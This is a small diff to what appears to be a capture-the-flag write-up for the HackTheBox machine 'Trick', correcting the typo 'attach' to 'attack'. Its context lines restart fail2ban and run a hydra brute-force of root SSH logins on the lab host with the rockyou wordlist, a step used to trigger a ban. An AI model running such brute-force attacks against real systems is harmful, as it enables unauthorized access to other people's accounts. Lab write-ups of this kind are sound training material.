@@ -226,7 +226,7 @@ then restarting the daemon
 sudo /etc/init.d/fail2ban restart
 [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
-Now of course we need to trigger the ban, lets do a bruteforce attach with hydra  
+Now of course we need to trigger the ban, lets do a bruteforce attack with hydra  
 ```bash
 hydra ssh://trick.htb -l root -P /usr/share/wordlists/rockyou.txt
 ```
